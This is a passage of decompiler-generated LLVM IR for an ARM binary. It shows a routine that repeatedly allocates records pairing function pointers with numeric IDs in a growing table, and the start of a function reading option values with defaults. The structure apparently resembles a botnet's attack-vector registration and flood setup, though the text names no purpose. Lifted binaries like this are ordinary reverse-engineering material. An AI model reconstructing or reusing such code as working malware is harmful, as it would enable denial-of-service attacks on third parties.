  %v2_b314 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b314 = zext i8 %v2_b314 to i32
  store i32 ptrtoint (i32* @global_var_e508.122 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i32 %v3_b310, i32* %r5.global-to-local, align 4
  %v3_b324 = mul nuw nsw i32 %v3_b314, 4
  store i32 %v3_b324, i32* %r1.global-to-local, align 4
  %v2_b328 = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 ptrtoint (i32* @global_var_e508.122 to i32), i32* %v2_b310, align 4
  %v2_b330 = load i32, i32* %r5.global-to-local, align 4
  %v3_b330 = add i32 %v2_b330, 4
  %v4_b330 = inttoptr i32 %v3_b330 to i8*
  store i8 1, i8* %v4_b330, align 1
  %v0_b334 = load i32, i32* %r1.global-to-local, align 4
  %v1_b334 = add i32 %v0_b334, 4
  store i32 %v1_b334, i32* %r1.global-to-local, align 4
  %v3_b338 = inttoptr i32 %v2_b328 to i32*
  %v4_b338 = call i32* @realloc(i32* %v3_b338, i32 %v1_b334)
  %v6_b338 = ptrtoint i32* %v4_b338 to i32
  %v2_b33c = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b33c = zext i8 %v2_b33c to i32
  store i32 %v3_b33c, i32* %r3.global-to-local, align 4
  store i32 %v6_b338, i32* %ip.global-to-local, align 4
  %v0_b344 = load i32, i32* %r5.global-to-local, align 4
  %v5_b344 = mul nuw nsw i32 %v3_b33c, 4
  %v6_b344 = add i32 %v5_b344, %v6_b338
  %v7_b344 = inttoptr i32 %v6_b344 to i32*
  store i32 %v0_b344, i32* %v7_b344, align 4
  %v0_b348 = load i32, i32* %r3.global-to-local, align 4
  %v1_b348 = load i32, i32* %r7.global-to-local, align 4
  %v2_b348 = add i32 %v1_b348, %v0_b348
  store i32 %v2_b348, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b354 = load i32, i32* %ip.global-to-local, align 4
  %v1_b354 = load i32, i32* %r6.global-to-local, align 4
  %v2_b354 = inttoptr i32 %v1_b354 to i32*
  store i32 %v0_b354, i32* %v2_b354, align 4
  %v0_b358 = load i32, i32* %r2.global-to-local, align 4
  %v1_b358 = trunc i32 %v0_b358 to i8
  %v2_b358 = load i32, i32* %r4.global-to-local, align 4
  %v3_b358 = inttoptr i32 %v2_b358 to i8*
  store i8 %v1_b358, i8* %v3_b358, align 1
  %v2_b35c = call i32* @calloc(i32 %v1_b348, i32 8)
  %v4_b35c = ptrtoint i32* %v2_b35c to i32
  %v2_b360 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b360 = zext i8 %v2_b360 to i32
  store i32 ptrtoint (i32* @global_var_e9cc.124 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b35c, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  %v3_b370 = mul nuw nsw i32 %v3_b360, 4
  store i32 %v3_b370, i32* %r1.global-to-local, align 4
  %v2_b374 = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 ptrtoint (i32* @global_var_e9cc.124 to i32), i32* %v2_b35c, align 4
  %v0_b37c = load i32, i32* %r3.global-to-local, align 4
  %v1_b37c = trunc i32 %v0_b37c to i8
  %v2_b37c = load i32, i32* %r5.global-to-local, align 4
  %v3_b37c = add i32 %v2_b37c, 4
  %v4_b37c = inttoptr i32 %v3_b37c to i8*
  store i8 %v1_b37c, i8* %v4_b37c, align 1
  %v0_b380 = load i32, i32* %r1.global-to-local, align 4
  %v1_b380 = add i32 %v0_b380, 4
  store i32 %v1_b380, i32* %r1.global-to-local, align 4
  %v4_b384 = inttoptr i32 %v2_b374 to i32*
  %v5_b384 = call i32* @realloc(i32* %v4_b384, i32 %v1_b380)
  %v7_b384 = ptrtoint i32* %v5_b384 to i32
  %v2_b388 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b388 = zext i8 %v2_b388 to i32
  store i32 %v3_b388, i32* %r3.global-to-local, align 4
  store i32 %v7_b384, i32* %ip.global-to-local, align 4
  %v0_b390 = load i32, i32* %r5.global-to-local, align 4
  %v5_b390 = mul nuw nsw i32 %v3_b388, 4
  %v6_b390 = add i32 %v5_b390, %v7_b384
  %v7_b390 = inttoptr i32 %v6_b390 to i32*
  store i32 %v0_b390, i32* %v7_b390, align 4
  %v0_b394 = load i32, i32* %r3.global-to-local, align 4
  %v1_b394 = load i32, i32* %r7.global-to-local, align 4
  %v2_b394 = add i32 %v1_b394, %v0_b394
  store i32 %v2_b394, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b3a0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b3a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b3a0 = inttoptr i32 %v1_b3a0 to i32*
  store i32 %v0_b3a0, i32* %v2_b3a0, align 4
  %v0_b3a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3a4 = trunc i32 %v0_b3a4 to i8
  %v2_b3a4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3a4 = inttoptr i32 %v2_b3a4 to i8*
  store i8 %v1_b3a4, i8* %v3_b3a4, align 1
  %v2_b3a8 = call i32* @calloc(i32 %v1_b394, i32 8)
  %v4_b3a8 = ptrtoint i32* %v2_b3a8 to i32
  %v2_b3ac = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b3ac = zext i8 %v2_b3ac to i32
  store i32 ptrtoint (i32* @global_var_db98.126 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b3a8, i32* %r5.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v3_b3bc = mul nuw nsw i32 %v3_b3ac, 4
  store i32 %v3_b3bc, i32* %r1.global-to-local, align 4
  %v2_b3c0 = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 ptrtoint (i32* @global_var_db98.126 to i32), i32* %v2_b3a8, align 4
  %v0_b3c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3c8 = trunc i32 %v0_b3c8 to i8
  %v2_b3c8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b3c8 = add i32 %v2_b3c8, 4
  %v4_b3c8 = inttoptr i32 %v3_b3c8 to i8*
  store i8 %v1_b3c8, i8* %v4_b3c8, align 1
  %v0_b3cc = load i32, i32* %r1.global-to-local, align 4
  %v1_b3cc = add i32 %v0_b3cc, 4
  store i32 %v1_b3cc, i32* %r1.global-to-local, align 4
  %v4_b3d0 = inttoptr i32 %v2_b3c0 to i32*
  %v5_b3d0 = call i32* @realloc(i32* %v4_b3d0, i32 %v1_b3cc)
  %v7_b3d0 = ptrtoint i32* %v5_b3d0 to i32
  %v2_b3d4 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b3d4 = zext i8 %v2_b3d4 to i32
  store i32 %v3_b3d4, i32* %r3.global-to-local, align 4
  store i32 %v7_b3d0, i32* %ip.global-to-local, align 4
  %v0_b3dc = load i32, i32* %r5.global-to-local, align 4
  %v5_b3dc = mul nuw nsw i32 %v3_b3d4, 4
  %v6_b3dc = add i32 %v5_b3dc, %v7_b3d0
  %v7_b3dc = inttoptr i32 %v6_b3dc to i32*
  store i32 %v0_b3dc, i32* %v7_b3dc, align 4
  %v0_b3e0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b3e0 = load i32, i32* %r7.global-to-local, align 4
  %v2_b3e0 = add i32 %v1_b3e0, %v0_b3e0
  store i32 %v2_b3e0, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b3ec = load i32, i32* %ip.global-to-local, align 4
  %v1_b3ec = load i32, i32* %r6.global-to-local, align 4
  %v2_b3ec = inttoptr i32 %v1_b3ec to i32*
  store i32 %v0_b3ec, i32* %v2_b3ec, align 4
  %v0_b3f0 = load i32, i32* %r2.global-to-local, align 4
  %v1_b3f0 = trunc i32 %v0_b3f0 to i8
  %v2_b3f0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b3f0 = inttoptr i32 %v2_b3f0 to i8*
  store i8 %v1_b3f0, i8* %v3_b3f0, align 1
  %v2_b3f4 = call i32* @calloc(i32 %v1_b3e0, i32 8)
  %v4_b3f4 = ptrtoint i32* %v2_b3f4 to i32
  %v2_b3f8 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b3f8 = zext i8 %v2_b3f8 to i32
  store i32 ptrtoint (i32* @global_var_d454.128 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b3f4, i32* %r5.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  %v3_b408 = mul nuw nsw i32 %v3_b3f8, 4
  store i32 %v3_b408, i32* %r1.global-to-local, align 4
  %v2_b40c = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 ptrtoint (i32* @global_var_d454.128 to i32), i32* %v2_b3f4, align 4
  %v0_b414 = load i32, i32* %r3.global-to-local, align 4
  %v1_b414 = trunc i32 %v0_b414 to i8
  %v2_b414 = load i32, i32* %r5.global-to-local, align 4
  %v3_b414 = add i32 %v2_b414, 4
  %v4_b414 = inttoptr i32 %v3_b414 to i8*
  store i8 %v1_b414, i8* %v4_b414, align 1
  %v0_b418 = load i32, i32* %r1.global-to-local, align 4
  %v1_b418 = add i32 %v0_b418, 4
  store i32 %v1_b418, i32* %r1.global-to-local, align 4
  %v4_b41c = inttoptr i32 %v2_b40c to i32*
  %v5_b41c = call i32* @realloc(i32* %v4_b41c, i32 %v1_b418)
  %v7_b41c = ptrtoint i32* %v5_b41c to i32
  %v2_b420 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b420 = zext i8 %v2_b420 to i32
  store i32 %v3_b420, i32* %r3.global-to-local, align 4
  store i32 %v7_b41c, i32* %ip.global-to-local, align 4
  %v0_b428 = load i32, i32* %r5.global-to-local, align 4
  %v5_b428 = mul nuw nsw i32 %v3_b420, 4
  %v6_b428 = add i32 %v5_b428, %v7_b41c
  %v7_b428 = inttoptr i32 %v6_b428 to i32*
  store i32 %v0_b428, i32* %v7_b428, align 4
  %v0_b42c = load i32, i32* %r3.global-to-local, align 4
  %v1_b42c = load i32, i32* %r7.global-to-local, align 4
  %v2_b42c = add i32 %v1_b42c, %v0_b42c
  store i32 %v2_b42c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b438 = load i32, i32* %ip.global-to-local, align 4
  %v1_b438 = load i32, i32* %r6.global-to-local, align 4
  %v2_b438 = inttoptr i32 %v1_b438 to i32*
  store i32 %v0_b438, i32* %v2_b438, align 4
  %v0_b43c = load i32, i32* %r2.global-to-local, align 4
  %v1_b43c = trunc i32 %v0_b43c to i8
  %v2_b43c = load i32, i32* %r4.global-to-local, align 4
  %v3_b43c = inttoptr i32 %v2_b43c to i8*
  store i8 %v1_b43c, i8* %v3_b43c, align 1
  %v2_b440 = call i32* @calloc(i32 %v1_b42c, i32 8)
  %v4_b440 = ptrtoint i32* %v2_b440 to i32
  %v2_b444 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b444 = zext i8 %v2_b444 to i32
  store i32 ptrtoint (i32* @global_var_cce0.130 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b440, i32* %r5.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v3_b454 = mul nuw nsw i32 %v3_b444, 4
  store i32 %v3_b454, i32* %r1.global-to-local, align 4
  %v2_b458 = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 ptrtoint (i32* @global_var_cce0.130 to i32), i32* %v2_b440, align 4
  %v0_b460 = load i32, i32* %r3.global-to-local, align 4
  %v1_b460 = trunc i32 %v0_b460 to i8
  %v2_b460 = load i32, i32* %r5.global-to-local, align 4
  %v3_b460 = add i32 %v2_b460, 4
  %v4_b460 = inttoptr i32 %v3_b460 to i8*
  store i8 %v1_b460, i8* %v4_b460, align 1
  %v0_b464 = load i32, i32* %r1.global-to-local, align 4
  %v1_b464 = add i32 %v0_b464, 4
  store i32 %v1_b464, i32* %r1.global-to-local, align 4
  %v4_b468 = inttoptr i32 %v2_b458 to i32*
  %v5_b468 = call i32* @realloc(i32* %v4_b468, i32 %v1_b464)
  %v7_b468 = ptrtoint i32* %v5_b468 to i32
  %v2_b46c = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b46c = zext i8 %v2_b46c to i32
  store i32 %v3_b46c, i32* %r3.global-to-local, align 4
  store i32 %v7_b468, i32* %ip.global-to-local, align 4
  %v0_b474 = load i32, i32* %r5.global-to-local, align 4
  %v5_b474 = mul nuw nsw i32 %v3_b46c, 4
  %v6_b474 = add i32 %v5_b474, %v7_b468
  %v7_b474 = inttoptr i32 %v6_b474 to i32*
  store i32 %v0_b474, i32* %v7_b474, align 4
  %v0_b478 = load i32, i32* %r3.global-to-local, align 4
  %v1_b478 = load i32, i32* %r7.global-to-local, align 4
  %v2_b478 = add i32 %v1_b478, %v0_b478
  store i32 %v2_b478, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b484 = load i32, i32* %ip.global-to-local, align 4
  %v1_b484 = load i32, i32* %r6.global-to-local, align 4
  %v2_b484 = inttoptr i32 %v1_b484 to i32*
  store i32 %v0_b484, i32* %v2_b484, align 4
  %v0_b488 = load i32, i32* %r2.global-to-local, align 4
  %v1_b488 = trunc i32 %v0_b488 to i8
  %v2_b488 = load i32, i32* %r4.global-to-local, align 4
  %v3_b488 = inttoptr i32 %v2_b488 to i8*
  store i8 %v1_b488, i8* %v3_b488, align 1
  %v2_b48c = call i32* @calloc(i32 %v1_b478, i32 8)
  %v4_b48c = ptrtoint i32* %v2_b48c to i32
  %v2_b490 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b490 = zext i8 %v2_b490 to i32
  store i32 ptrtoint (i32* @global_var_c480.132 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b48c, i32* %r5.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v3_b4a0 = mul nuw nsw i32 %v3_b490, 4
  store i32 %v3_b4a0, i32* %r1.global-to-local, align 4
  %v2_b4a4 = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 ptrtoint (i32* @global_var_c480.132 to i32), i32* %v2_b48c, align 4
  %v0_b4ac = load i32, i32* %r3.global-to-local, align 4
  %v1_b4ac = trunc i32 %v0_b4ac to i8
  %v2_b4ac = load i32, i32* %r5.global-to-local, align 4
  %v3_b4ac = add i32 %v2_b4ac, 4
  %v4_b4ac = inttoptr i32 %v3_b4ac to i8*
  store i8 %v1_b4ac, i8* %v4_b4ac, align 1
  %v0_b4b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_b4b0 = add i32 %v0_b4b0, 4
  store i32 %v1_b4b0, i32* %r1.global-to-local, align 4
  %v4_b4b4 = inttoptr i32 %v2_b4a4 to i32*
  %v5_b4b4 = call i32* @realloc(i32* %v4_b4b4, i32 %v1_b4b0)
  %v7_b4b4 = ptrtoint i32* %v5_b4b4 to i32
  %v2_b4b8 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b4b8 = zext i8 %v2_b4b8 to i32
  store i32 %v3_b4b8, i32* %r3.global-to-local, align 4
  store i32 %v7_b4b4, i32* %ip.global-to-local, align 4
  %v0_b4c0 = load i32, i32* %r5.global-to-local, align 4
  %v5_b4c0 = mul nuw nsw i32 %v3_b4b8, 4
  %v6_b4c0 = add i32 %v5_b4c0, %v7_b4b4
  %v7_b4c0 = inttoptr i32 %v6_b4c0 to i32*
  store i32 %v0_b4c0, i32* %v7_b4c0, align 4
  %v0_b4c4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b4c4 = load i32, i32* %r7.global-to-local, align 4
  %v2_b4c4 = add i32 %v1_b4c4, %v0_b4c4
  store i32 %v2_b4c4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b4d0 = load i32, i32* %ip.global-to-local, align 4
  %v1_b4d0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b4d0 = inttoptr i32 %v1_b4d0 to i32*
  store i32 %v0_b4d0, i32* %v2_b4d0, align 4
  %v0_b4d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_b4d4 = trunc i32 %v0_b4d4 to i8
  %v2_b4d4 = load i32, i32* %r4.global-to-local, align 4
  %v3_b4d4 = inttoptr i32 %v2_b4d4 to i8*
  store i8 %v1_b4d4, i8* %v3_b4d4, align 1
  %v2_b4d8 = call i32* @calloc(i32 %v1_b4c4, i32 8)
  %v4_b4d8 = ptrtoint i32* %v2_b4d8 to i32
  %v2_b4dc = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b4dc = zext i8 %v2_b4dc to i32
  store i32 ptrtoint (i32* @global_var_bd64.134 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b4d8, i32* %r5.global-to-local, align 4
  store i32 6, i32* %r3.global-to-local, align 4
  %v3_b4ec = mul nuw nsw i32 %v3_b4dc, 4
  store i32 %v3_b4ec, i32* %r1.global-to-local, align 4
  %v2_b4f0 = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 ptrtoint (i32* @global_var_bd64.134 to i32), i32* %v2_b4d8, align 4
  %v0_b4f8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b4f8 = trunc i32 %v0_b4f8 to i8
  %v2_b4f8 = load i32, i32* %r5.global-to-local, align 4
  %v3_b4f8 = add i32 %v2_b4f8, 4
  %v4_b4f8 = inttoptr i32 %v3_b4f8 to i8*
  store i8 %v1_b4f8, i8* %v4_b4f8, align 1
  %v0_b4fc = load i32, i32* %r1.global-to-local, align 4
  %v1_b4fc = add i32 %v0_b4fc, 4
  store i32 %v1_b4fc, i32* %r1.global-to-local, align 4
  %v4_b500 = inttoptr i32 %v2_b4f0 to i32*
  %v5_b500 = call i32* @realloc(i32* %v4_b500, i32 %v1_b4fc)
  %v7_b500 = ptrtoint i32* %v5_b500 to i32
  %v2_b504 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b504 = zext i8 %v2_b504 to i32
  store i32 %v3_b504, i32* %r3.global-to-local, align 4
  store i32 %v7_b500, i32* %ip.global-to-local, align 4
  %v0_b50c = load i32, i32* %r5.global-to-local, align 4
  %v5_b50c = mul nuw nsw i32 %v3_b504, 4
  %v6_b50c = add i32 %v5_b50c, %v7_b500
  %v7_b50c = inttoptr i32 %v6_b50c to i32*
  store i32 %v0_b50c, i32* %v7_b50c, align 4
  %v0_b510 = load i32, i32* %r3.global-to-local, align 4
  %v1_b510 = load i32, i32* %r7.global-to-local, align 4
  %v2_b510 = add i32 %v1_b510, %v0_b510
  store i32 %v2_b510, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v0_b51c = load i32, i32* %ip.global-to-local, align 4
  %v1_b51c = load i32, i32* %r6.global-to-local, align 4
  %v2_b51c = inttoptr i32 %v1_b51c to i32*
  store i32 %v0_b51c, i32* %v2_b51c, align 4
  %v0_b520 = load i32, i32* %r2.global-to-local, align 4
  %v1_b520 = trunc i32 %v0_b520 to i8
  %v2_b520 = load i32, i32* %r4.global-to-local, align 4
  %v3_b520 = inttoptr i32 %v2_b520 to i8*
  store i8 %v1_b520, i8* %v3_b520, align 1
  %v2_b524 = call i32* @calloc(i32 %v1_b510, i32 8)
  %v4_b524 = ptrtoint i32* %v2_b524 to i32
  %v2_b528 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b528 = zext i8 %v2_b528 to i32
  store i32 ptrtoint (i32* @global_var_b5e8.136 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b524, i32* %r5.global-to-local, align 4
  store i32 7, i32* %r3.global-to-local, align 4
  %v3_b538 = mul nuw nsw i32 %v3_b528, 4
  store i32 %v3_b538, i32* %r1.global-to-local, align 4
  %v2_b53c = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 ptrtoint (i32* @global_var_b5e8.136 to i32), i32* %v2_b524, align 4
  %v0_b544 = load i32, i32* %r3.global-to-local, align 4
  %v1_b544 = trunc i32 %v0_b544 to i8
  %v2_b544 = load i32, i32* %r5.global-to-local, align 4
  %v3_b544 = add i32 %v2_b544, 4
  %v4_b544 = inttoptr i32 %v3_b544 to i8*
  store i8 %v1_b544, i8* %v4_b544, align 1
  %v0_b548 = load i32, i32* %r1.global-to-local, align 4
  %v1_b548 = add i32 %v0_b548, 4
  store i32 %v1_b548, i32* %r1.global-to-local, align 4
  %v4_b54c = inttoptr i32 %v2_b53c to i32*
  %v5_b54c = call i32* @realloc(i32* %v4_b54c, i32 %v1_b548)
  %v7_b54c = ptrtoint i32* %v5_b54c to i32
  %v2_b550 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b550 = zext i8 %v2_b550 to i32
  store i32 %v3_b550, i32* %r3.global-to-local, align 4
  store i32 %v7_b54c, i32* %ip.global-to-local, align 4
  %v0_b558 = load i32, i32* %r5.global-to-local, align 4
  %v5_b558 = mul nuw nsw i32 %v3_b550, 4
  %v6_b558 = add i32 %v5_b558, %v7_b54c
  %v7_b558 = inttoptr i32 %v6_b558 to i32*
  store i32 %v0_b558, i32* %v7_b558, align 4
  %v0_b55c = load i32, i32* %r3.global-to-local, align 4
  %v1_b55c = load i32, i32* %r7.global-to-local, align 4
  %v2_b55c = add i32 %v1_b55c, %v0_b55c
  store i32 %v2_b55c, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v1_b568 = trunc i32 %v2_b55c to i8
  %v2_b568 = load i32, i32* %r4.global-to-local, align 4
  %v3_b568 = inttoptr i32 %v2_b568 to i8*
  store i8 %v1_b568, i8* %v3_b568, align 1
  %v0_b56c = load i32, i32* %ip.global-to-local, align 4
  %v1_b56c = load i32, i32* %r6.global-to-local, align 4
  %v2_b56c = inttoptr i32 %v1_b56c to i32*
  store i32 %v0_b56c, i32* %v2_b56c, align 4
  %v2_b570 = call i32* @calloc(i32 %v1_b55c, i32 8)
  %v4_b570 = ptrtoint i32* %v2_b570 to i32
  %v2_b574 = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b574 = zext i8 %v2_b574 to i32
  store i32 ptrtoint (i32* @global_var_8f24.138 to i32), i32* %r2.global-to-local, align 4
  store i32 %v4_b570, i32* %r5.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v3_b584 = mul nuw nsw i32 %v3_b574, 4
  store i32 %v3_b584, i32* %r1.global-to-local, align 4
  %v2_b588 = load i32, i32* @global_var_1ccd4.111, align 4
  store i32 ptrtoint (i32* @global_var_8f24.138 to i32), i32* %v2_b570, align 4
  %v0_b590 = load i32, i32* %r3.global-to-local, align 4
  %v1_b590 = trunc i32 %v0_b590 to i8
  %v2_b590 = load i32, i32* %r5.global-to-local, align 4
  %v3_b590 = add i32 %v2_b590, 4
  %v4_b590 = inttoptr i32 %v3_b590 to i8*
  store i8 %v1_b590, i8* %v4_b590, align 1
  %v0_b594 = load i32, i32* %r1.global-to-local, align 4
  %v1_b594 = add i32 %v0_b594, 4
  store i32 %v1_b594, i32* %r1.global-to-local, align 4
  %v4_b598 = inttoptr i32 %v2_b588 to i32*
  %v5_b598 = call i32* @realloc(i32* %v4_b598, i32 %v1_b594)
  %v6_b598 = ptrtoint i32* %v5_b598 to i32
  %v2_b59c = load i8, i8* bitcast (i8** @global_var_1ccd0.109 to i8*), align 4
  %v3_b59c = zext i8 %v2_b59c to i32
  store i32 %v3_b59c, i32* %r3.global-to-local, align 4
  %v1_b5a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_b5a0 = inttoptr i32 %v1_b5a0 to i32*
  store i32 %v6_b598, i32* %v2_b5a0, align 4
  %v0_b5a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_b5a4 = load i32, i32* %r3.global-to-local, align 4
  %v5_b5a4 = mul i32 %v2_b5a4, 4
  %v6_b5a4 = add i32 %v5_b5a4, %v6_b598
  %v7_b5a4 = inttoptr i32 %v6_b5a4 to i32*
  store i32 %v0_b5a4, i32* %v7_b5a4, align 4
  %v0_b5a8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_b5a8 = add i32 %v1_b5a8, %v0_b5a8
  store i32 %v2_b5a8, i32* %r2.global-to-local, align 4
  %v1_b5b0 = trunc i32 %v2_b5a8 to i8
  %v2_b5b0 = load i32, i32* %r4.global-to-local, align 4
  %v3_b5b0 = inttoptr i32 %v2_b5b0 to i8*
  store i8 %v1_b5b0, i8* %v3_b5b0, align 1
  %v2_b5b4 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_b5b4, i32* @r4, align 4
  ret i32 %v1_b5a8

; uselistorder directives
  uselistorder i32 %v1_b5a8, { 1, 0 }
  uselistorder i32 %v1_b55c, { 1, 0 }
  uselistorder i32 %v1_b510, { 1, 0 }
  uselistorder i32 %v1_b4c4, { 1, 0 }
  uselistorder i32 %v1_b478, { 1, 0 }
  uselistorder i32 %v1_b42c, { 1, 0 }
  uselistorder i32 %v1_b3e0, { 1, 0 }
  uselistorder i32 %v1_b394, { 1, 0 }
  uselistorder i32 %v1_b348, { 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_1ccd0.109 to i8*), { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8** @global_var_1ccd0.109, { 1, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_1ccd0.109 to i32), { 1, 0 }
}

define i32 @function_b5e8(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_b5e8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-50 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %v3_b5e8 = load i32, i32* @r4, align 4
  %v6_b5e8 = load i32, i32* @r5, align 4
  %v9_b5e8 = load i32, i32* @r6, align 4
  %v12_b5e8 = load i32, i32* @r7, align 4
  %v15_b5e8 = load i32, i32* @r8, align 4
  %v21_b5e8 = load i32, i32* @sl, align 4
  %v1_b5ec = urem i32 %arg1, 256
  store i32 %v1_b5ec, i32* @fp, align 4
  store i32 %arg2, i32* @sb, align 4
  store i32 %v1_b5ec, i32* %r0.global-to-local, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 %arg4, i32* @r5, align 4
  %v1_b604 = urem i32 %arg3, 256
  store i32 %v1_b604, i32* @r4, align 4
  %v2_b608 = call i32* @calloc(i32 %v1_b5ec, i32 4)
  %v4_b608 = ptrtoint i32* %v2_b608 to i32
  %v0_b60c = load i32, i32* @r5, align 4
  store i32 %v0_b60c, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b61c = load i32, i32* @r4, align 4
  store i32 %v0_b61c, i32* %r0.global-to-local, align 4
  %v5_b620 = inttoptr i32 %v0_b60c to i32*
  %v6_b620 = call i32 @function_b240(i32 %v0_b61c, i32* %v5_b620, i32 2, i32 0)
  %v1_b62c = urem i32 %v6_b620, 256
  store i32 %v1_b62c, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b638 = load i32, i32* @r5, align 4
  store i32 %v0_b638, i32* %r1.global-to-local, align 4
  %v0_b63c = load i32, i32* @r4, align 4
  store i32 %v0_b63c, i32* %r0.global-to-local, align 4
  %v5_b640 = trunc i32 %v6_b620 to i8
  %v6_b644 = inttoptr i32 %v0_b638 to i32*
  %v7_b644 = call i32 @function_b240(i32 %v0_b63c, i32* %v6_b644, i32 3, i32 65535)
  %v0_b648 = load i32, i32* @r5, align 4
  store i32 %v0_b648, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b644, i32* @r7, align 4
  %v0_b658 = load i32, i32* @r4, align 4
  store i32 %v0_b658, i32* %r0.global-to-local, align 4
  %v4_b65c = inttoptr i32 %v0_b648 to i32*
  %v5_b65c = call i32 @function_b240(i32 %v0_b658, i32* %v4_b65c, i32 4, i32 64)
  %v1_b664 = urem i32 %v5_b65c, 256
  store i32 %v1_b664, i32* %ip.global-to-local, align 4
  %v0_b668 = load i32, i32* @r5, align 4
  store i32 %v0_b668, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
